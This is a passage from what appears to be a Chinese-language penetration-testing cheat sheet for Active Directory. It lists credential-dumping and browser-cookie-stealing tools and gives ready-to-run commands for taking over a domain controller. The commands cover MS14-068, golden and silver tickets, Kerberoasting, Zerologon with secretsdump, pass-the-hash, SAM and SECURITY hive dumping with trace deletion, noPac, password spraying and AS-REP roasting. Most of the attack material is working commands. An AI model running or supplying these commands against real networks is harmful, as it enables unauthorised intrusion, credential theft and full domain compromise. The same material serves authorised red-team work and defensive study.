class="line">分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表	tasklist /svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表	netstat -ano</span><br><span class="line">开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表	systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享	smbclient -L ip  </span><br><span class="line">		   net user \\ip\c$</span><br><span class="line">本机共享列表/访问权限 本机访问的域共享/访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure>
<h3 id="8获取当前用户密码"><a class="markdownIt-Anchor" href="#8获取当前用户密码">#</a> 8. 获取当前用户密码</h3>
<h4 id="windows"><a class="markdownIt-Anchor" href="#windows">#</a> Windows</h4>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/giMini/mimiDbg">mimiDbg</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
<li><a target="_blank" rel="noopener" href="http://launcher.nirsoft.net/downloads/">NirLauncher )</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></li>
</ul>
<h4 id="linux"><a class="markdownIt-Anchor" href="#linux">#</a> Linux</h4>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
</ul>
<h4 id="浏览器"><a class="markdownIt-Anchor" href="#浏览器">#</a> 浏览器</h4>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal (窃取浏览器 cookie)</a></li>
</ul>
<h4 id="navicat密码"><a class="markdownIt-Anchor" href="#navicat密码">#</a> Navicat 密码</h4>
<p>版本：Navicat 11 或 12</p>
<p>方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p>
<p>解密脚本：<a target="_blank" rel="noopener" href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p>
<h4 id="xshellxftp密码"><a class="markdownIt-Anchor" href="#xshellxftp密码">#</a> xshell&amp;xftp 密码</h4>
<p><a target="_blank" rel="noopener" href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p>
<h4 id="mremoteng密码"><a class="markdownIt-Anchor" href="#mremoteng密码">#</a> mRemoteNG 密码</h4>
<p><a target="_blank" rel="noopener" href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p>
<h2 id="扩散信息收集"><a class="markdownIt-Anchor" href="#扩散信息收集">#</a> 扩散信息收集</h2>
<h3 id="常用端口扫描工具"><a class="markdownIt-Anchor" href="#常用端口扫描工具">#</a> 常用端口扫描工具</h3>
<ul>
<li>nmap</li>
<li>masscan</li>
<li>zmap</li>
<li>s 扫描器</li>
<li>自写脚本</li>
<li>nc</li>
<li>……</li>
</ul>
<h3 id="内网拓扑架构分析"><a class="markdownIt-Anchor" href="#内网拓扑架构分析">#</a> 内网拓扑架构分析</h3>
<ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h3 id="常见信息收集命令"><a class="markdownIt-Anchor" href="#常见信息收集命令">#</a> 常见信息收集命令</h3>
<p>ipconfig：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>
<p>net</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname</span><br></pre></td></tr></table></figure>
<p>dsquery</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; /domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </span><br></pre></td></tr></table></figure>
<h3 id="第三方信息收集"><a class="markdownIt-Anchor" href="#第三方信息收集">#</a> 第三方信息收集</h3>
<ul>
<li>NETBIOS 信息收集</li>
<li>SMB 信息收集</li>
<li>空会话信息收集</li>
<li>漏洞信息收集等</li>
</ul>
<h1 id="3获取域控的方法"><a class="markdownIt-Anchor" href="#3获取域控的方法">#</a> 3. 获取域控的方法</h1>
<h5 id="sysvol"><a class="markdownIt-Anchor" href="#sysvol">#</a> SYSVOL</h5>
<p>SYSVOL 是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol 文件夹是安装 AD 时创建的，它用来存放 GPO、Script 等信息。同时，存放在 Sysvol 文件夹中的信息，会复制到域中所有 DC 上。 相关阅读:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/92016.html">寻找 SYSVOL 里的密码和攻击 GPP（组策略偏好）</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2 之四管理 Sysvol 文件夹</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2288">SYSVOL 中查找密码并利用组策略首选项</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用 SYSVOL 还原组策略中保存的密码</a></li>
</ul>
<h5 id="ms14-068-kerberos"><a class="markdownIt-Anchor" href="#ms14-068-kerberos">#</a> MS14-068 Kerberos</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>
<p>利用 mimikatz 将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache"> TGT_domainuser@SERVER.COM.ccache</a> 写入内存，创建缓存证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://adsecurity.org/?p=676">Kerberos 的工具包 PyKEK</a></li>
<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/56081.html">深入解读 MS14-068 漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=541">Kerberos 的安全漏洞</a></li>
</ul>
<h5 id="spn扫描"><a class="markdownIt-Anchor" href="#spn扫描">#</a> SPN 扫描</h5>
<p>Kerberoast 可以作为一个有效的方法从 Active Directory 中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内部帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册 SPN。 SPN 扫描的主要好处是，SPN 扫描不需要连接到网络上的每个 IP 来检查服务端口，SPN 通过 LDAP 查询向域控执行服务发现，SPN 查询是 Kerberos 的票据行为一部分，因此比较难检测 SPN 扫描。 相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的 SQL Server 发现</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN 扫描</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描 SQLServer 的脚本</a></li>
</ul>
<h5 id="kerberos的黄金门票"><a class="markdownIt-Anchor" href="#kerberos的黄金门票">#</a> Kerberos 的黄金门票</h5>
<p>在域上抓取的哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 </span><br><span class="line">/ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></li>
<li><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos 的认证原理</a></li>
<li><a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解 windows 安全认证机制 ntlm＆Kerberos</a></li>
</ul>
<h5 id="kerberos的银票务"><a class="markdownIt-Anchor" href="#kerberos的银票务">#</a> Kerberos 的银票务</h5>
<p>黄金票据和白银票据的一些区别： Golden Ticket：伪造 <code>TGT</code> ，可以获取 <code>任何Kerberos</code>  服务权限 银票：伪造 TGS， <code>只能访问指定的服务</code>  加密方式不同： Golden Ticket 由 <code>krbtgt</code>  的 hash 加密 Silver Ticket 由 <code>服务账号</code> （通常为计算机账户）Hash 加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">攻击者如何使用 Kerberos 的银票来利用系统</a></li>
<li>[域渗透 ——Pass The Ticket](<a target="_blank" rel="noopener" href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass">https://www.feiworks.com/wy/drops/ 域渗透 ——Pass</a> The Ticket.pdf)</li>
</ul>
<h5 id="域服务账号破解"><a class="markdownIt-Anchor" href="#域服务账号破解">#</a> 域服务账号破解</h5>
<p>与上面 SPN 扫描类似的原理 <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作 SPN 的帐户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q */*</span><br></pre></td></tr></table></figure>
<p>从 Mimikatz 的 RAM 中提取获得的门票</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
<p>用 rgsrepcrack 破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
<h5 id="凭证盗窃"><a class="markdownIt-Anchor" href="#凭证盗窃">#</a> 凭证盗窃</h5>
<p>从搜集的密码里面找管理员的密码</p>
<h5 id="ntlm-relay"><a class="markdownIt-Anchor" href="#ntlm-relay">#</a> NTLM relay</h5>
<ul>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li>
</ul>
<p>用于主动让目标机器发起 NTLM 请求的方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
</ul>
<p>Relay LDAP:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li>
</ul>
<p>Relay AD CS/PKI:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit</a></li>
</ul>
<p>集成几个利用的工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Relayx">Relayx</a></li>
</ul>
<p>内网 445 端口转发：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">PortBender</a></li>
</ul>
<h5 id="kerberos委派"><a class="markdownIt-Anchor" href="#kerberos委派">#</a> Kerberos 委派</h5>
<ul>
<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li>
<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li>
</ul>
<h5 id="地址解析协议"><a class="markdownIt-Anchor" href="#地址解析协议">#</a> 地址解析协议</h5>
<p>实在搞不定再搞 ARP</p>
<h5 id="zerologon漏洞"><a class="markdownIt-Anchor" href="#zerologon漏洞">#</a> zerologon 漏洞</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot; </span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">CVE-2020-1472 的分析与复现 (0range-x.github.io)</a></p>
<p>**1、利用 Mimikatz **check</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$</span><br></pre></td></tr></table></figure>
<p><strong>exploit</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit</span><br></pre></td></tr></table></figure>
<p><strong>dcsync</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgt</span><br></pre></td></tr></table></figure>
<p><strong>restore</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:conttosson.locl /account:dc$ </span><br></pre></td></tr></table></figure>
<p><strong>2、利用 impacket：</strong></p>
<ul>
<li>取目标主机名 + IP</li>
<li>install 修改版本的 impacket</li>
<li>Exp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67" alt="img"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -history -just-dc-user administrator</span><br><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/administrator@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67" alt="img"></a></p>
<p>获取到旧的密码明文 hex，还原</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67" alt="img"></a></p>
<p>恢复方法 2</p>
<p>通过 wmic, pass the hash 拿到域控制器中的本地管理员权限 (域管)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38</span><br></pre></td></tr></table></figure>
<p>然后分别执行，拷贝本机中 SAM 数据库到本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del /f system.save</span><br><span class="line">- del /f sam.save</span><br><span class="line">- del /f security.save</span><br></pre></td></tr></table></figure>
<p>提取明文 hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
<p>然后恢复。</p>
<h5 id="cve-2021-42278-cve-2021-42287"><a class="markdownIt-Anchor" href="#cve-2021-42278-cve-2021-42287">#</a> CVE-2021-42278 &amp;&amp; CVE-2021-42287</h5>
<p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">noPac: CVE-2021-42287/CVE-2021-42278</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./noPac.exe -domain dc.com -user username -pass &#x27;password&#x27; /dc owa.dc.com</span><br><span class="line">/mAccount mAusername /mPassword password /service cifs /ptt</span><br></pre></td></tr></table></figure>
<h1 id="4列出可匿名访问的smb共享"><a class="markdownIt-Anchor" href="#4列出可匿名访问的smb共享">#</a> 4. 列出可匿名访问的 SMB 共享</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbclient -U &#x27;%&#x27; -L //&lt;dc-ip&gt; &amp;&amp; smbclient -U &#x27;guest%&#x27; -L //&lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; # 枚举可空Session访问的SMB共享</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;a&#x27; -p &#x27;&#x27; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure>
<h1 id="5枚举ldap"><a class="markdownIt-Anchor" href="#5枚举ldap">#</a> 5. 枚举 LDAP</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;ip&gt; -s base  </span><br></pre></td></tr></table></figure>
<h1 id="6查找用户名"><a class="markdownIt-Anchor" href="#6查找用户名">#</a> 6. 查找用户名</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -U &lt;dc-ip&gt; | grep &#x27;user:&#x27;</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --users </span><br><span class="line"></span><br><span class="line">nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;&lt;domain&gt;&#x27;,userdb=&lt;users_list_file&gt;&quot; &lt;ip&gt; </span><br><span class="line"></span><br><span class="line">OSINT - 在互联网上寻找用户名</span><br></pre></td></tr></table></figure>
<h2 id="得到账号但是没有密码"><a class="markdownIt-Anchor" href="#得到账号但是没有密码">#</a> 得到账号，但是没有密码</h2>
<h3 id="密码喷洒"><a class="markdownIt-Anchor" href="#密码喷洒">#</a> 密码喷洒</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取域密码策略 ：</span><br><span class="line">crackmapexec &lt;IP&gt; -u &#x27;user&#x27; -p &#x27;password&#x27; --pass-pol</span><br><span class="line">enum4linx -u &#x27;username&#x27; -p &#x27;password&#x27; -P &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user=password</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁</span><br></pre></td></tr></table></figure>
<h3 id="asrep-roasting攻击"><a class="markdownIt-Anchor" href="#asrep-roasting攻击">#</a> ASREP-Roasting 攻击</h3>
<h4 id="获取hash"><a class="markdownIt-Anchor" href="#获取hash">#</a> 获取 hash</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line"></span><br><span class="line">Rubeus asreproast /format:hashcat</span><br></pre></td></tr></table></figure>
